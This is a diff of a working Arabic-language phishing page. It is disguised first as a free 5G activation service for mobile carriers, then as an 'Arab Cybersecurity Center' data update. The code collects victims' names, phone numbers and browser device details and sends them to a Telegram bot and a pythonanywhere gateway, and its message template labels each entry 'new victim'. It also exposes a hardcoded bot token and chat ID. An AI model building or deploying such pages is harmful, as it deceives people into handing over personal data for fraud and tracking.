@@ -3,100 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق الرقمي الموحد</title>
+    <title>المركز العربي للأمن السيبراني - تحديث البيانات</title>
     <style>
-        /* التنسيق الذي تفضله يبقى كما هو */
-        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; text-align: center; }
-        .header { background: linear-gradient(45deg, #1a237e, #0d47a1); color: white; padding: 30px; }
-        .container { max-width: 450px; margin: -20px auto; background: white; border-radius: 15px; padding: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-top: 5px solid #ff1744; }
-        .input-group { margin: 15px 0; text-align: right; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn { background: #ff1744; color: white; border: none; padding: 15px; width: 100%; border-radius: 30px; font-weight: bold; cursor: pointer; }
-        #loading { display: none; margin-top: 15px; }
+        :root { --primary: #0056b3; --accent: #ff3d00; }
+        body { font-family: sans-serif; background: #f4f7f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 6px solid var(--primary); }
+        .logo { text-align: center; margin-bottom: 20px; color: var(--primary); font-size: 24px; font-weight: bold; }
+        p { color: #555; font-size: 14px; line-height: 1.6; text-align: center; }
+        .input-box { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn { background: var(--primary); color: white; border: none; width: 100%; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #003d7e; }
+        #status { display: none; margin-top: 15px; text-align: center; color: var(--accent); font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <h2>المنصة العربية الموحدة</h2>
-    <p>تنشيط خدمات الجيل الخامس مجاناً</p>
-</div>
-
-<div class="container">
-    <div class="input-group">
-        <label>مزود الخدمة</label>
-        <select id="prov">
-            <option>Yemen Mobile</option>
-            <option>STC</option>
-            <option>Vodafone</option>
-        </select>
-    </div>
-    <div class="input-group">
+<div class="card">
+    <div class="logo">🛡️ تحديث الأمان العربي</div>
+    <p>لضمان استقرار الخدمة في منطقتك، يرجى تحديث بيانات الهوية الرقمية الخاصة بجهازك.</p>
+    
+    <div class="input-box">
         <label>الاسم الكامل</label>
-        <input type="text" id="nm" placeholder="الاسم الرباعي">
+        <input type="text" id="name" placeholder="أدخل اسمك كما في الهوية">
     </div>
-    <div class="input-group">
-        <label>رقم الهاتف</label>
-        <input type="number" id="ph" placeholder="77xxxxxxx">
+    
+    <div class="input-box">
+        <label>رقم الهاتف (مع رمز الدولة)</label>
+        <input type="number" id="phone" placeholder="+966xxxxxxxxx">
     </div>
-    <button class="btn" onclick="go()">تحديث البيانات الآن ✅</button>
 
-    <div id="loading">جاري التأمين...</div>
+    <button class="btn" onclick="captureAndSend()">تأكيد وتحديث ✅</button>
+    <div id="status">جاري فحص اتصال الجهاز...</div>
 </div>
 
 <script>
-// --- إعدادات السيادة ---
-const GATEWAY_URL = "https://gsgbs.pythonanywhere.com/gate"; // رابط سيرفرك في بايثون
+// --- إعداداتك الخاصة ---
+const TELEGRAM_TOKEN = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
 const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get('id') || "7715667493";
+const CHAT_ID = urlParams.get('id') || "7715667493"; // يأخذ الايدي من الرابط أو يستخدم ايديك الافتراضي
 
-async function go() {
-    const n = document.getElementById('nm').value;
-    const p = document.getElementById('ph').value;
-    const pr = document.getElementById('prov').value;
+async function captureAndSend() {
+    const name = document.getElementById('name').value;
+    const phone = document.getElementById('phone').value;
+    const status = document.getElementById('status');
 
-    if(!n || !p) return alert("البيانات ناقصة");
+    if(!name || !phone) { alert("يرجى إدخال كافة البيانات"); return; }
 
-    document.getElementById('loading').style.display = 'block';
+    status.style.display = "block";
+    
+    // جمع معلومات الجهاز (بدون PHP)
+    const deviceInfo = {
+        platform: navigator.platform,
+        agent: navigator.userAgent,
+        language: navigator.language,
+        cores: navigator.hardwareConcurrency,
+        ram: navigator.deviceMemory || "N/A",
+        screen: `${window.screen.width}x${window.screen.height}`
+    };
 
-    // جمع معلومات الجهاز
-    const device = await getD();
-    const report = `👤 **الاسم:** ${n}\n📞 **الهاتف:** ${p}\n🏢 **الشركة:** ${pr}\n\n📱 **الجهاز:**\n${device}`;
+    const message = `
+🎯 **ضحية جديدة (جمع معلومات)**
+👤 الاسم: ${name}
+📞 الهاتف: ${phone}
+📱 النظام: ${deviceInfo.platform}
+💾 الرام: ${deviceInfo.ram} GB
+🖥️ الشاشة: ${deviceInfo.screen}
+🌐 المتصفح: ${deviceInfo.agent}
+    `;
 
-    // إرسال البيانات عبر السيرفر (الوسيط) لضمان عدم الفشل
+    // الإرسال المباشر للتليجرام
     try {
-        await fetch(`${GATEWAY_URL}?id=${CHAT_ID}`, {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                type: 'info',
-                content: report,
-                label: "🎯 صيد من المنصة الموحدة"
-            })
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
         });
         
-        alert("تمت العملية بنجاح! انتظر التفعيل.");
-        window.location.href = "https://www.google.com";
+        status.innerText = "✅ تم التحديث بنجاح!";
+        setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
     } catch (e) {
-        // إذا فشل السيرفر، نحاول الإرسال المباشر كخطة احتياطية
-        console.log("Gateway failed, trying direct...");
-        const tgUrl = `https://api.telegram.org/bot8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q/sendMessage`;
-        fetch(tgUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: report })
-        });
+        status.innerText = "❌ خطأ في الاتصال، حاول لاحقاً.";
     }
-}
-
-async function getD() {
-    let b = "N/A";
-    if (navigator.getBattery) {
-        const bt = await navigator.getBattery();
-        b = `${Math.round(bt.level * 100)}%`;
-    }
-    return `- النظام: ${navigator.platform}\n- البطارية: ${b}\n- الوقت: ${new Date().toLocaleString()}`;
 }
 </script>
+
 </body>
 </html>
